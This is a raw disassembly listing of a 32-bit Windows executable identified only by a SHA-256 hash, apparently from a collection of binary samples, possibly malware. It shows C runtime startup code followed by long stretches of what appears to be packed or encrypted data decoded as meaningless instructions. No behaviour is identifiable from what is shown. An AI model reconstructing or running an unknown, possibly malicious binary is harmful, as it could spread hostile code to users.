
4c5cdf14bb3e1fd93fdb12dfaebcec8fdfb6bbeb578673984bd81294dfa69f7d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	push   0xffffffff
  401005:	push   0x422f60
  40100a:	push   0x4205c0
  40100f:	mov    eax,fs:0x0
  401015:	push   eax
  401016:	mov    DWORD PTR fs:0x0,esp
  40101d:	sub    esp,0x68
  401020:	push   ebx
  401021:	push   esi
  401022:	push   edi
  401023:	mov    DWORD PTR [ebp-0x18],esp
  401026:	xor    ebx,ebx
  401028:	mov    DWORD PTR [ebp-0x4],ebx
  40102b:	push   0x2
  40102d:	call   DWORD PTR ds:0x42104c
  401033:	pop    ecx
  401034:	or     DWORD PTR ds:0x427274,0xffffffff
  40103b:	or     DWORD PTR ds:0x427278,0xffffffff
  401042:	call   DWORD PTR ds:0x421048
  401048:	mov    ecx,DWORD PTR ds:0x427270
  40104e:	mov    DWORD PTR [eax],ecx
  401050:	call   DWORD PTR ds:0x421044
  401056:	mov    ecx,DWORD PTR ds:0x42726c
  40105c:	mov    DWORD PTR [eax],ecx
  40105e:	mov    eax,ds:0x421040
  401063:	mov    eax,DWORD PTR [eax]
  401065:	mov    ds:0x42727c,eax
  40106a:	call   0x4076c6
  40106f:	cmp    DWORD PTR ds:0x426d80,ebx
  401075:	jne    0x401083
  401077:	push   0x4205b8
  40107c:	call   DWORD PTR ds:0x421030
  401082:	pop    ecx
  401083:	call   0x4205a6
  401088:	push   0x42400c
  40108d:	push   0x424008
  401092:	call   0x4205a0
  401097:	mov    eax,ds:0x427268
  40109c:	mov    DWORD PTR [ebp-0x6c],eax
  40109f:	lea    eax,[ebp-0x6c]
  4010a2:	push   eax
  4010a3:	push   DWORD PTR ds:0x427264
  4010a9:	lea    eax,[ebp-0x64]
  4010ac:	push   eax
  4010ad:	lea    eax,[ebp-0x70]
  4010b0:	push   eax
  4010b1:	lea    eax,[ebp-0x60]
  4010b4:	push   eax
  4010b5:	call   DWORD PTR ds:0x42102c
  4010bb:	push   0x424004
  4010c0:	push   0x424000
  4010c5:	call   0x4205a0
  4010ca:	add    esp,0x24
  4010cd:	mov    eax,ds:0x421058
  4010d2:	mov    esi,DWORD PTR [eax]
  4010d4:	mov    DWORD PTR [ebp-0x74],esi
  4010d7:	cmp    BYTE PTR [esi],0x22
  4010da:	jne    0x401116
  4010dc:	inc    esi
  4010dd:	mov    DWORD PTR [ebp-0x74],esi
  4010e0:	mov    al,BYTE PTR [esi]
  4010e2:	cmp    al,bl
  4010e4:	je     0x4010ea
  4010e6:	cmp    al,0x22
  4010e8:	jne    0x4010dc
  4010ea:	cmp    BYTE PTR [esi],0x22
  4010ed:	jne    0x4010f3
  4010ef:	inc    esi
  4010f0:	mov    DWORD PTR [ebp-0x74],esi
  4010f3:	mov    al,BYTE PTR [esi]
  4010f5:	cmp    al,bl
  4010f7:	je     0x4010fd
  4010f9:	cmp    al,0x20
  4010fb:	jbe    0x4010ef
  4010fd:	mov    DWORD PTR [ebp-0x30],ebx
  401100:	lea    eax,[ebp-0x5c]
  401103:	push   eax
  401104:	call   DWORD PTR ds:0x421018
  40110a:	test   BYTE PTR [ebp-0x30],0x1
  40110e:	je     0x401121
  401110:	movzx  eax,WORD PTR [ebp-0x2c]
  401114:	jmp    0x401124
  401116:	cmp    BYTE PTR [esi],0x20
  401119:	jbe    0x4010f3
  40111b:	inc    esi
  40111c:	mov    DWORD PTR [ebp-0x74],esi
  40111f:	jmp    0x401116
  401121:	push   0xa
  401123:	pop    eax
  401124:	push   eax
  401125:	push   esi
  401126:	push   ebx
  401127:	push   ebx
  401128:	call   DWORD PTR ds:0x42101c
  40112e:	push   eax
  40112f:	call   0x41cfa0
  401134:	mov    DWORD PTR [ebp-0x68],eax
  401137:	push   eax
  401138:	call   DWORD PTR ds:0x421034
  40113e:	mov    eax,DWORD PTR [ebp-0x14]
  401141:	mov    ecx,DWORD PTR [eax]
  401143:	mov    ecx,DWORD PTR [ecx]
  401145:	mov    DWORD PTR [ebp-0x78],ecx
  401148:	push   eax
  401149:	push   ecx
  40114a:	call   0x413954
  40114f:	pop    ecx
  401150:	pop    ecx
  401151:	ret    
  401152:	mov    esp,DWORD PTR [ebp-0x18]
  401155:	push   DWORD PTR [ebp-0x78]
  401158:	call   DWORD PTR ds:0x42103c
  40115e:	int3   
  40115f:	int3   
  401160:	mov    eax,DWORD PTR [ebx+0x1]
  401163:	inc    ebx
  401164:	inc    ecx
  401165:	cmp    al,dl
  401167:	jne    0x401160
  401169:	ret    
  40116a:	int3   
  40116b:	int3   
  40116c:	int3   
  40116d:	int3   
  40116e:	int3   
  40116f:	int3   
  401170:	push   esi
  401171:	xor    eax,eax
  401173:	push   edi
  401174:	mov    edi,DWORD PTR [esp+0x10]
  401178:	mov    esi,DWORD PTR [esp+0xc]
  40117c:	mov    ecx,eax
  40117e:	call   0x40ca90
  401183:	cmp    eax,ecx
  401185:	jne    0x40118f
  401187:	or     eax,eax
  401189:	je     0x401192
  40118b:	inc    esi
  40118c:	inc    edi
  40118d:	jmp    0x40117e
  40118f:	xor    eax,eax
  401191:	inc    eax
  401192:	pop    edi
  401193:	pop    esi
  401194:	ret    0x8
  401197:	int3   
  401198:	int3   
  401199:	int3   
  40119a:	int3   
  40119b:	int3   
  40119c:	int3   
  40119d:	int3   
  40119e:	int3   
  40119f:	int3   
  4011a0:	add    BYTE PTR [eax],al
  4011a2:	inc    eax
  4011a3:	add    eax,0x62404041
  4011a8:	and    eax,0x25050043
  4011ad:	inc    ecx
  4011ae:	inc    ebx
  4011af:	inc    eax
  4011b0:	test   BYTE PTR [eax+0x0],al
  4011b3:	bound  ebx,QWORD PTR [eax+0x62]
  4011b6:	inc    ecx
  4011b7:	inc    eax
  4011b8:	and    eax,DWORD PTR cs:[ecx+0x62]
  4011bc:	cmp    BYTE PTR [eax+eax*2-0x31ab4b1],bh
  4011c3:	int    0x6b
  4011c5:	inc    edx
  4011c6:	inc    esp
  4011c7:	add    BYTE PTR [edx+0x50587f75],dl
  4011cd:	in     al,dx
  4011ce:	inc    eax
  4011cf:	xor    DWORD PTR [edx],esi
  4011d1:	xor    BYTE PTR [eax+0x41406210],ch
  4011d7:	and    eax,0x40000500
  4011dc:	inc    ebx
  4011dd:	add    eax,0x40624041
  4011e2:	inc    ebx
  4011e3:	add    eax,0x43402541
  4011e8:	bound  eax,QWORD PTR [eax+0x43]
  4011eb:	int3   
  4011ec:	inc    eax
  4011ed:	bound  eax,QWORD PTR [eax]
  4011ef:	inc    ecx
  4011f0:	inc    eax
  4011f1:	inc    eax
  4011f2:	add    eax,0x5065f505
  4011f7:	inc    eax
  4011f8:	dec    edx
  4011f9:	inc    esp
  4011fa:	sub    dl,BYTE PTR [eax]
  4011fc:	dec    esi
  4011fd:	js     0x401262
  4011ff:	inc    eax
  401200:	xor    DWORD PTR [ecx+0x403045b4],0xffffff93
  401207:	inc    ebx
  401208:	dec    edx
  401209:	push   esp
  40120a:	iret   
  40120b:	xlat   BYTE PTR ds:[ebx]
  40120c:	or     BYTE PTR [ebp-0x28fcbfb7],bh
  401212:	inc    edi
  401213:	popf   
  401214:	lds    ebp,FWORD PTR [edi+0x31]
  401217:	inc    eax
  401218:	jg     0x40123d
  40121a:	sub    eax,0x54acdaab
  40121f:	inc    eax
  401220:	mov    edx,ebx
  401222:	bound  eax,QWORD PTR [eax+0x25]
  401225:	add    BYTE PTR [esi+0x40],ah
  401228:	add    eax,0x40404143
  40122d:	inc    ebx
  40122e:	add    BYTE PTR [eax],al
  401230:	add    BYTE PTR [edx-0x34],ah
  401233:	inc    eax
  401234:	add    eax,0x40004041
  401239:	inc    ecx
  40123a:	int3   
  40123b:	add    BYTE PTR [ebx-0x7c],al
  40123e:	add    eax,0x5406240
  401243:	bound  eax,QWORD PTR [esp+eax*2+0x4260409e]
  40124a:	jg     0x401292
  40124c:	pop    ecx
  40124d:	imul   ecx,esi,0xffffffbd
  401250:	cmp    DWORD PTR [eax-0x41],eax
  401253:	jno    0x40122e
  401255:	daa    
  401256:	cdq    
  401257:	ins    BYTE PTR es:[edi],dx
  401258:	dec    esp
  401259:	inc    eax
  40125a:	jns    0x40124b
  40125c:	dec    ecx
  40125d:	arpl   WORD PTR [ebp-0x7ebf64e8],sp
  401263:	dec    esi
  401264:	adc    DWORD PTR [edi],ecx
  401266:	pop    edx
  401267:	inc    eax
  401268:	and    DWORD PTR [ecx+0x0],eax
  40126b:	adc    edi,edx
  40126d:	jno    0x4012e2
  40126f:	mov    ebp,0x4e0f40da
  401274:	inc    eax
  401275:	bound  ebx,QWORD PTR [eax+0x41]
  401278:	add    eax,0x40404340
  40127d:	inc    ebx
  40127e:	inc    eax
  40127f:	test   BYTE PTR [eax],al
  401281:	add    eax,0x40624041
  401286:	inc    eax
  401287:	add    BYTE PTR [edx+0x5],ah
  40128a:	inc    ebx
  40128b:	add    BYTE PTR [eax+0x78],al
  40128e:	inc    ecx
  40128f:	add    BYTE PTR [eax+0x41],bl
  401292:	bound  ebp,QWORD PTR [esi+0x4843ccd1]
  401298:	inc    eax
  401299:	push   DWORD PTR [ecx]
  40129b:	dec    esi
  40129c:	inc    edx
  40129d:	or     eax,0x75402160
  4012a2:	dec    esp
  4012a3:	and    eax,esi
  4012a5:	inc    esp
  4012a6:	push   0x92834139
  4012ab:	ins    BYTE PTR es:[edi],dx
  4012ac:	mov    esp,0x4056e0ef
  4012b1:	push   ebx
  4012b2:	xor    BYTE PTR [edi],dh
  4012b4:	adc    cl,bh
  4012b6:	push   0x510140c4
  4012bb:	inc    edi
  4012bc:	inc    eax
  4012bd:	test   BYTE PTR [eax],al
  4012bf:	int3   
  4012c0:	bound  eax,QWORD PTR ds:0xcc840f41
  4012c6:	inc    ebx
  4012c7:	add    BYTE PTR [eax+0x0],al
  4012ca:	inc    eax
  4012cb:	inc    eax
  4012cc:	inc    eax
  4012cd:	int3   
  4012ce:	add    BYTE PTR ds:0x62404341,al
  4012d4:	pop    eax
  4012d5:	add    BYTE PTR [ebx+0x40],al
  4012d8:	bound  ecx,QWORD PTR [edi]
  4012da:	inc    eax
  4012db:	gs retf 0x7242
  4012df:	inc    eax
  4012e0:	xor    eax,0x56270d1
  4012e5:	stos   DWORD PTR es:[edi],eax
  4012e6:	pusha  
  4012e7:	inc    ebx
  4012e8:	add    al,0x47
  4012ea:	(bad)  
  4012eb:	leave  
  4012ec:	push   0xffffffa8
  4012ee:	bound  eax,QWORD PTR [eax-0x47]
  4012f1:	xchg   ebp,eax
  4012f2:	inc    eax
  4012f3:	mov    esp,0x400c0597
  4012f8:	inc    eax
  4012f9:	xor    DWORD PTR [eax+0x21],eax
  4012fc:	enter  0x0,0x40
  401300:	inc    eax
  401301:	cmovno eax,DWORD PTR ds:0x40056243
  401308:	int3   
  401309:	add    ah,cl
  40130b:	inc    eax
  40130c:	inc    eax
  40130d:	bound  eax,QWORD PTR [ecx+0x0]
  401310:	add    BYTE PTR [edi],cl
  401312:	inc    ebx
  401313:	inc    eax
  401314:	inc    eax
  401315:	add    BYTE PTR [ecx+0x43],al
  401318:	add    eax,0x40256240
  40131d:	bound  eax,QWORD PTR [eax]
  40131f:	retf   
  401320:	loopne 0x401362
  401322:	sub    DWORD PTR [ecx],ebx
  401324:	mov    bh,0x16
  401326:	adc    eax,DWORD PTR [ebp+0x62]
  401329:	inc    eax
  40132a:	pop    ecx
  40132b:	dec    ecx
  40132c:	inc    eax
  40132d:	(bad)  
  40132e:	in     eax,dx
  40132f:	inc    ebx
  401330:	mov    ds:0x40710130,eax
  401335:	imul   ebx,DWORD PTR [esi+0x59],0x20
  401339:	jmp    0x4140:0xcc0005e6
  401340:	inc    eax
  401341:	inc    ebx
  401342:	bound  esp,QWORD PTR ds:0x41400043
  401348:	add    BYTE PTR [eax],al
  40134a:	add    eax,0x43624062
  40134f:	inc    ecx
  401350:	inc    eax
  401351:	inc    eax
  401352:	inc    eax
  401353:	add    eax,0x40624340
  401358:	add    eax,0x40664140
  40135d:	scas   eax,DWORD PTR es:[edi]
  40135e:	inc    eax
  40135f:	cmp    al,0xc6
  401361:	rcl    BYTE PTR [ecx],0x74
  401364:	add    DWORD PTR [eax],eax
  401366:	inc    eax
  401367:	bound  ecx,QWORD PTR ds:0xa3fde83c
  40136d:	push   ecx
  40136e:	fs push ebp
  401370:	dec    ecx
  401371:	daa    
  401372:	push   0xfffffff7
  401374:	imul   ebx,DWORD PTR [esp+edi*1-0x8],0xffffffea
  401379:	imul   esi,DWORD PTR [ebx-0x36],0x6362bb81
  401380:	stc    
  401381:	(bad)  
  401382:	enter  0x43,0x5
  401386:	inc    eax
  401387:	js     0x401399
  401389:	inc    ecx
  40138a:	bound  eax,QWORD PTR [eax+0x40]
  40138d:	sldt   WORD PTR [eax-0x34]
  401391:	js     0x4013f5
  401393:	add    eax,0x40664143
  401398:	inc    ebx
  401399:	add    BYTE PTR [ecx+0x5],al
  40139c:	js     0x4013de
  40139e:	bound  eax,QWORD PTR [eax+0x0]
  4013a1:	inc    eax
  4013a2:	add    BYTE PTR [edx+0x15],0x40
  4013a6:	fadd   st,st(4)
  4013a8:	aad    0x4b
  4013aa:	dec    ecx
  4013ab:	xor    DWORD PTR [esi],0xd8057c40
  4013b1:	test   eax,0x412d4e71
  4013b6:	xor    al,0x55
  4013b8:	test   al,0x14
  4013ba:	in     al,dx
  4013bb:	add    BYTE PTR [esi-0x62],0x41
  4013bf:	inc    ebx
  4013c0:	inc    eax
  4013c1:	inc    eax
  4013c2:	add    eax,0x434162
  4013c7:	inc    eax
  4013c8:	add    BYTE PTR [edx+0x5],ah
  4013cb:	inc    eax
  4013cc:	adc    BYTE PTR [edx+0x40],ah
  4013cf:	inc    ebx
  4013d0:	inc    ecx
  4013d1:	add    eax,0x4340
  4013d6:	add    eax,0x404162
  4013db:	add    BYTE PTR [eax+0x43],al
  4013de:	inc    eax
  4013df:	add    eax,0x1e12cb56
  4013e4:	add    eax,0x9a143421
  4013e9:	or     al,0x48
  4013eb:	gs dec ecx
  4013ed:	jns    0x4013f5
  4013ef:	pusha  
  4013f0:	add    eax,0xc74c42f8
  4013f5:	add    DWORD PTR [eax+0x44],eax
  4013f8:	pop    ecx
  4013f9:	ret    0x3466
  4013fc:	add    al,dh
  4013fe:	jne    0x40143c
  401400:	loope  0x401417
  401402:	call   0x74c2d247
  401407:	inc    eax
  401408:	jge    0x40144b
  40140a:	bound  ebp,QWORD PTR [ecx+eax*2+0x10]
  40140e:	xchg   ebp,eax
  40140f:	and    al,0xc3
  401411:	pop    esi
  401412:	imul   eax,DWORD PTR [ecx+0x40],0x12
  401416:	stos   DWORD PTR es:[edi],eax
  401417:	inc    eax
  401418:	add    BYTE PTR [eax],al
  40141a:	inc    ecx
  40141b:	inc    ebx
  40141c:	add    eax,0x41784062
  401421:	inc    eax
  401422:	inc    eax
  401423:	add    BYTE PTR [edi],cl
  401425:	bound  eax,QWORD PTR [ebx+0x0]
  401428:	add    eax,0x25006240
  40142d:	inc    eax
  40142e:	add    eax,0x40254143
  401433:	add    eax,0x65620000
  401438:	addr16 hlt 
  40143a:	cmp    al,0x45
  40143c:	inc    eax
  40143d:	sahf   
  40143e:	addr16 pusha 
  401440:	(bad)  
  401441:	cli    
  401442:	pop    esp
  401443:	xor    al,0x40
  401445:	lods   eax,DWORD PTR ds:[esi]
  401446:	adc    bh,BYTE PTR [edx+0x40]
  401449:	shr    BYTE PTR [edx],0x42
  40144c:	dec    esp
  40144d:	outs   dx,BYTE PTR ds:[esi]
  40144e:	cmp    BYTE PTR [eax],ch
  401450:	dec    esp
  401451:	or     eax,0x40402c10
  401456:	inc    eax
  401457:	xor    al,0x67
  401459:	inc    ebx
  40145a:	add    BYTE PTR [eax],al
  40145c:	add    BYTE PTR [ecx+0x40],al
  40145f:	bound  esp,QWORD PTR [esi+0x0]
  401462:	inc    eax
  401463:	add    eax,0x5400000
  401468:	inc    ecx
  401469:	inc    eax
  40146a:	inc    eax
  40146b:	bound  esp,QWORD PTR ds:0x25050043
  401471:	inc    ecx
  401472:	inc    ebx
  401473:	inc    eax
  401474:	test   BYTE PTR [eax+0x0],al
  401477:	bound  ebx,QWORD PTR [eax+0x62]
  40147a:	inc    ecx
  40147b:	inc    eax
  40147c:	pop    edi
  40147d:	mov    esp,0x2500407f
  401482:	daa    
  401483:	or     al,0x83
  401485:	add    eax,0x512c4018
  40148a:	cmp    BYTE PTR cs:[ebx],dl
  40148d:	inc    edx
  40148e:	and    eax,0x252b4458
  401493:	inc    esp
  401494:	pop    esp
  401495:	pop    ecx
  401496:	dec    ebx
  401497:	inc    eax
  401498:	add    BYTE PTR [edx+0xc],bl
  40149b:	mov    BYTE PTR [edx-0x60],bl
  40149e:	cld    
  40149f:	inc    eax
  4014a0:	pop    ss
  4014a1:	loope  0x4014b3
  4014a3:	bound  eax,QWORD PTR [eax+0x41]
  4014a6:	and    eax,0x40000500
  4014ab:	inc    ebx
  4014ac:	add    eax,0x40624041
  4014b1:	inc    ebx
  4014b2:	add    eax,0x43402541
  4014b7:	bound  eax,QWORD PTR [eax+0x43]
  4014ba:	int3   
  4014bb:	inc    eax
  4014bc:	bound  eax,QWORD PTR [eax]
  4014be:	inc    ecx
  4014bf:	inc    eax
  4014c0:	inc    eax
  4014c1:	add    eax,0x5f674805
  4014c6:	push   0x8
  4014c8:	inc    eax
  4014c9:	dec    edx
  4014ca:	ins    DWORD PTR es:[edi],dx
  4014cb:	dec    esp
  4014cc:	int3   
  4014cd:	xor    BYTE PTR [eax+ebp*4],0x54
  4014d1:	add    ah,BYTE PTR [edi+0xff8abac]
  4014d7:	adc    DWORD PTR [eax+0x30],eax
  4014da:	mov    bh,0x42
  4014dc:	inc    edx
  4014dd:	mov    esp,0x2404822
  4014e2:	popa   
  4014e3:	bound  eax,QWORD PTR [eax+0x25]
  4014e6:	add    BYTE PTR [esi+0x40],ah
  4014e9:	add    eax,0x40404143
  4014ee:	inc    ebx
  4014ef:	add    BYTE PTR [eax],al
  4014f1:	add    BYTE PTR [edx-0x34],ah
  4014f4:	inc    eax
  4014f5:	add    eax,0x40004041
  4014fa:	inc    ecx
  4014fb:	int3   
  4014fc:	add    BYTE PTR [ebx-0x7c],al
  4014ff:	add    eax,0x5406240
  401504:	bound  edi,QWORD PTR [eax]
  401506:	stos   DWORD PTR es:[edi],eax
  401507:	mov    eax,ds:0x40410f
  40150c:	iret   
  40150d:	xor    eax,DWORD PTR [ecx+0x52]
  401510:	cld    
  401511:	je     0x401563
  401513:	adc    eax,0xd5fd2fe4
  401518:	ins    BYTE PTR es:[edi],dx
  401519:	or     BYTE PTR [eax+0x32],al
  40151c:	popa   
  40151d:	sub    al,0x74
  40151f:	inc    ecx
  401520:	shl    BYTE PTR [ebx+0x40],0x21
  401524:	pop    esi
  401525:	and    esp,DWORD PTR [ebp-0x13]
  401528:	ins    BYTE PTR es:[edi],dx
  401529:	push   ss
  40152a:	inc    eax
  40152b:	and    BYTE PTR [ecx+0x41],0x41
  40152f:	dec    ebp
  401530:	arpl   WORD PTR [ecx+0x4066604c],bp
  401536:	leave  
  401537:	and    al,al
  401539:	mov    eax,0x6240ec40
  40153e:	pop    eax
  40153f:	inc    ecx
  401540:	add    eax,0x40404340
  401545:	inc    ebx
  401546:	inc    eax
  401547:	test   BYTE PTR [eax],al
  401549:	add    eax,0x40624041
  40154e:	inc    eax
  40154f:	add    BYTE PTR [edx+0x5],ah
  401552:	inc    ebx
  401553:	add    BYTE PTR [eax+0x78],al
  401556:	inc    ecx
  401557:	add    BYTE PTR [eax+0x41],bl
  40155a:	bound  ebp,QWORD PTR [ecx-0x5dc5bad4]
  401560:	add    BYTE PTR [eax+0x2],0x48
  401564:	addr16 repnz int 0xf1
  401568:	mov    DWORD PTR [eax+0x2d],0x5d504922
  40156f:	imul   edx,DWORD PTR [eax+0x48],0x133c2f60
  401576:	repnz rol BYTE PTR [ebx+0x40],cl
  40157a:	add    eax,DWORD PTR [ebx+eax*2]
  40157d:	ror    DWORD PTR [ebp+0x63],0xc9
  401581:	inc    eax
  401582:	xlat   BYTE PTR ds:[ebx]
  401583:	arpl   WORD PTR [eax],bp
  401585:	inc    eax
  401586:	test   BYTE PTR [eax],al
  401588:	int3   
  401589:	bound  eax,QWORD PTR ds:0xcc840f41
  40158f:	inc    ebx
  401590:	add    BYTE PTR [eax+0x0],al
  401593:	inc    eax
  401594:	inc    eax
  401595:	inc    eax
  401596:	int3   
  401597:	add    BYTE PTR ds:0x62404341,al
  40159d:	pop    eax
  40159e:	add    BYTE PTR [ebx+0x40],al
  4015a1:	bound  ecx,QWORD PTR [edi]
  4015a3:	inc    eax
  4015a4:	bound  esp,QWORD PTR [eax]
  4015a6:	xchg   BYTE PTR [ecx+0x40],cl
  4015a9:	or     DWORD PTR [edi+0x4d],0x3469386d
  4015b0:	inc    esp
  4015b1:	push   ebx
  4015b2:	and    esp,DWORD PTR ds:0x12d1c5c4
  4015b8:	inc    eax
  4015b9:	add    BYTE PTR [eax],0x0
  4015bc:	inc    eax
  4015bd:	inc    eax
  4015be:	cmovno eax,DWORD PTR ds:0x40056243
  4015c5:	int3   
  4015c6:	add    ah,cl
  4015c8:	inc    eax
  4015c9:	inc    eax
  4015ca:	bound  eax,QWORD PTR [ecx+0x0]
  4015cd:	add    BYTE PTR [edi],cl
  4015cf:	inc    ebx
  4015d0:	inc    eax
  4015d1:	inc    eax
  4015d2:	add    BYTE PTR [ecx+0x43],al
  4015d5:	add    eax,0x40256240
  4015da:	bound  eax,QWORD PTR [eax]
  4015dc:	popa   
  4015dd:	bound  ecx,QWORD PTR ss:[edx+0x41]
  4015e1:	and    al,BYTE PTR [eax+0x17]
  4015e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015e5:	sub    DWORD PTR [edi+0x244860e2],edx
  4015eb:	sub    al,0xb7
  4015ed:	sub    al,0x28
  4015ef:	dec    eax
  4015f0:	inc    esp
  4015f1:	adc    eax,0x15e3265
  4015f6:	xor    BYTE PTR [si-0x35],ch
  4015fa:	pusha  
  4015fb:	add    DWORD PTR ds:0xc136536d,esp
  401601:	push   edx
  401602:	jp     0x401666
  401604:	push   esi
  401605:	xor    BYTE PTR [ecx-0x33fffaa1],ch
  40160b:	inc    eax
  40160c:	inc    ecx
  40160d:	inc    eax
  40160e:	inc    ebx
  40160f:	bound  esp,QWORD PTR ds:0x41400043
  401615:	add    BYTE PTR [eax],al
  401617:	add    eax,0x43624062
  40161c:	inc    ecx
  40161d:	inc    eax
  40161e:	inc    eax
  40161f:	inc    eax
  401620:	add    eax,0x40624340
  401625:	add    eax,0x40664140
  40162a:	gs xor al,0x28
  40162d:	and    DWORD PTR [ecx+0x481a825],0x6d6c3440
  401637:	and    eax,0x6002fa10
  40163c:	daa    
  40163d:	and    DWORD PTR [ecx+0x43b80b],0x10784005
  401647:	inc    ecx
  401648:	bound  eax,QWORD PTR [eax+0x40]
  40164b:	sldt   WORD PTR [eax-0x34]
  40164f:	js     0x4016b3
  401651:	add    eax,0x40664143
  401656:	inc    ebx
  401657:	add    BYTE PTR [ecx+0x5],al
  40165a:	js     0x40169c
  40165c:	bound  eax,QWORD PTR [eax+0x0]
  40165f:	inc    eax
  401660:	test   BYTE PTR [esp+eax*2+0x607d102e],ah
  401667:	inc    edx
  401668:	mov    ch,0xde
  40166a:	sub    DWORD PTR ds:0x637a2101,esp
  401670:	pop    ebx
  401671:	(bad)  
  401672:	fmul   QWORD PTR [eax+eiz*2]
  401675:	fs dec edx
  401677:	cmp    al,0xcb
  401679:	ins    DWORD PTR es:[edi],dx
  40167a:	pop    ebx
  40167b:	ins    DWORD PTR es:[edi],dx
  40167c:	pop    ecx
  40167d:	and    eax,0x5c906244
  401682:	xor    al,0x34
  401684:	push   edx
  401685:	div    BYTE PTR [eax]
  401687:	adc    DWORD PTR [ebx],edx
  401689:	fs inc eax
  40168b:	cs mov ecx,ebp
  40168e:	and    eax,DWORD PTR [ebx+0x5c]
  401691:	mov    eax,0x4139255c
  401696:	inc    ebx
  401697:	inc    eax
  401698:	inc    eax
  401699:	add    eax,0x434162
  40169e:	inc    eax
  40169f:	add    BYTE PTR [edx+0x5],ah
  4016a2:	inc    eax
  4016a3:	adc    BYTE PTR [edx+0x40],ah
  4016a6:	inc    ebx
  4016a7:	inc    ecx
  4016a8:	add    eax,0x4340
  4016ad:	add    eax,0x404162
  4016b2:	add    BYTE PTR [eax+0x43],al
  4016b5:	inc    eax
  4016b6:	add    eax,0x5a40254c
  4016bb:	cld    
  4016bc:	inc    ecx
  4016bd:	xor    al,0x57
  4016bf:	and    eax,0xfd5f012e
  4016c4:	ret    0x12e
  4016c7:	push   ebp
  4016c8:	cs stos DWORD PTR es:[edi],eax
  4016ca:	mov    al,ds:0x2b2fc063
  4016cf:	and    ebp,DWORD PTR [edi]
  4016d1:	call   0x3a4cb62
  4016d6:	cmp    DWORD PTR [edi-0x3857aafd],0xc3d24034
  4016e0:	inc    ebx
  4016e1:	retf   
  4016e2:	pop    edx
  4016e3:	adc    DWORD PTR [eax+0x4a],eax
  4016e6:	add    BYTE PTR [ebx+0x40],ah
  4016e9:	add    BYTE PTR [eax],al
  4016eb:	inc    ecx
  4016ec:	inc    ebx
  4016ed:	add    eax,0x41784062
  4016f2:	inc    eax
  4016f3:	inc    eax
  4016f4:	add    BYTE PTR [edi],cl
  4016f6:	bound  eax,QWORD PTR [ebx+0x0]
  4016f9:	add    eax,0x25006240
  4016fe:	inc    eax
  4016ff:	add    eax,0x40254143
  401704:	add    eax,0x77620000
  401709:	inc    ebp
  40170a:	pop    edi
  40170b:	bound  ecx,QWORD PTR [eax+0x4d]
  40170e:	je     0x40177c
  401710:	and    al,0x83
  401712:	mov    al,ds:0x3f254171
  401717:	jne    0x401766
  401719:	test   bh,bh
  40171b:	mov    WORD PTR [edx+0x33],fs
  40171e:	add    dl,dl
  401720:	and    al,0x63
  401722:	add    cl,0xf8
  401725:	das    
  401726:	pusha  
  401727:	popa   
  401728:	and    eax,0x674c5a46
  40172d:	sub    al,0x7
  40172f:	dec    ebx
  401730:	and    al,0xcc
  401732:	mov    WORD PTR [ebx+0x58],fs
  401735:	and    eax,DWORD PTR [ebx+0x0]
  401738:	add    BYTE PTR [eax],al
  40173a:	inc    ecx
  40173b:	inc    eax
  40173c:	bound  esp,QWORD PTR [esi+0x0]
  40173f:	inc    eax
  401740:	add    eax,0x5400000
  401745:	inc    ecx
  401746:	inc    eax
  401747:	inc    eax
  401748:	bound  esp,QWORD PTR ds:0x25050043
  40174e:	inc    ecx
  40174f:	inc    ebx
  401750:	inc    eax
  401751:	test   BYTE PTR [eax+0x0],al
  401754:	bound  ebx,QWORD PTR [eax+0x62]
  401757:	inc    ecx
  401758:	inc    eax
  401759:	and    DWORD PTR [ecx+0xd47c2f],0x4b1d60c7
  401763:	and    esp,DWORD PTR [ebp+0x5a]
  401766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401767:	fnstsw WORD PTR [edx-0x80]
  40176a:	loopne 0x40179a
  40176c:	mov    ch,0x73
  40176e:	test   al,0x40
  401770:	cs stos DWORD PTR es:[edi],eax
  401772:	xor    eax,0x10bf4425
  401777:	bound  eax,QWORD PTR [eax+0x41]
  40177a:	and    eax,0x40000500
  40177f:	inc    ebx
  401780:	add    eax,0x40624041
  401785:	inc    ebx
  401786:	add    eax,0x43402541
  40178b:	bound  eax,QWORD PTR [eax+0x43]
  40178e:	int3   
  40178f:	inc    eax
  401790:	bound  eax,QWORD PTR [eax]
  401792:	inc    ecx
  401793:	inc    eax
  401794:	inc    eax
  401795:	add    eax,0x2fcc4505
  40179a:	adc    ebx,DWORD PTR [esi+0x2c]
  40179d:	pop    ss
  40179e:	mov    edi,0x4029cf2a
  4017a3:	and    DWORD PTR [edx],esi
  4017a5:	and    eax,0x34281fbf
  4017aa:	adc    ch,BYTE PTR [ecx]
  4017ac:	xor    eax,0x5134021e
  4017b1:	and    eax,DWORD PTR [edi+0x21]
  4017b4:	ins    DWORD PTR es:[edi],dx
  4017b5:	adc    al,ch
  4017b7:	inc    esp
  4017b8:	cwde   
  4017b9:	and    eax,0xa82dbb82
  4017be:	inc    ebx
  4017bf:	push   0x67
  4017c1:	and    ebx,DWORD PTR cs:[eax+0x32]
  4017c5:	adc    DWORD PTR [eax],esp
  4017c7:	cmp    al,0xa0
  4017c9:	cs das 
  4017cb:	out    0x2f,eax
  4017cd:	inc    edx
  4017ce:	hlt    
  4017cf:	push   0x5
  4017d1:	das    
  4017d2:	bound  eax,QWORD PTR [eax+0x25]
  4017d5:	add    BYTE PTR [esi+0x40],ah
  4017d8:	add    eax,0x40404143
  4017dd:	inc    ebx
  4017de:	add    BYTE PTR [eax],al
  4017e0:	add    BYTE PTR [edx-0x34],ah
  4017e3:	inc    eax
  4017e4:	add    eax,0x40004041
  4017e9:	inc    ecx
  4017ea:	int3   
  4017eb:	add    BYTE PTR [ebx-0x7c],al
  4017ee:	add    eax,0x5406240
  4017f3:	bound  eax,QWORD PTR [ecx]
  4017f5:	push   0x65448126
  4017fa:	retf   
  4017fb:	add    eax,DWORD PTR [eax-0x5f]
  4017fe:	ins    DWORD PTR es:[edi],dx
  4017ff:	ret    
  401800:	sub    al,0x3c
  401802:	inc    esp
  401803:	inc    eax
  401804:	add    ch,bh
  401806:	aaa    
  401807:	dec    eax
  401808:	add    BYTE PTR [ebp+0x40],ah
  40180b:	bound  ebx,QWORD PTR [eax+0x41]
  40180e:	add    eax,0x40404340
  401813:	inc    ebx
  401814:	inc    eax
  401815:	test   BYTE PTR [eax],al
  401817:	add    eax,0x40624041
  40181c:	inc    eax
